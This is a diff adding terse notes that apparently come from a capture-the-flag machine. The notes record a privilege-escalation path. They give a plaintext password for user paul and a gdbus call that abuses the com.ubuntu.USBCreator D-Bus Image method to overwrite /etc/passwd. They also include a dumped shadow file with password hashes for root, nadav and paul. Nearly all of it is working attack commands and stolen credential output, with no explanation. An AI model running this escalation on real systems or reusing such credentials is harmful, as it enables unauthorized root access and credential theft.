@@ -1,0 +1,51 @@
+Register and run exploit
+su paul with atlanta1
+
+find nadav key in authorized_keys
+
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/test/passwd /etc/passwd true
+
+root:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:17954:0:99999:7:::
+uuidd:*:17954:0:99999:7:::
+lightdm:*:17954:0:99999:7:::
+whoopsie:*:17954:0:99999:7:::
+avahi-autoipd:*:17954:0:99999:7:::
+avahi:*:17954:0:99999:7:::
+dnsmasq:*:17954:0:99999:7:::
+colord:*:17954:0:99999:7:::
+speech-dispatcher:!:17954:0:99999:7:::
+hplip:*:17954:0:99999:7:::
+kernoops:*:17954:0:99999:7:::
+pulse:*:17954:0:99999:7:::
+rtkit:*:17954:0:99999:7:::
+saned:*:17954:0:99999:7:::
+usbmux:*:17954:0:99999:7:::
+nadav:$6$D30IVulR$vENayGqKX8L0RYB/wcf7ZMfFHyCedmEIu4zXw7bZcH3GBrCrBzHJ3Y/in96pthdcp5cU.0UTXobQLu7T0INzk1:18464:0:99999:7:::
+paul:$6$cpGlwRS2$AhcQyxAskjvAQtS4vpO0VgNW0liHRbLSosZlrHpzL3XTfPHmeDL7hWkut1kCjgNnEHIdU9J019hQTAMH6nzxe1:18464:0:99999:7:::
+sshd:*:18464:0:99999:7:::
+
+
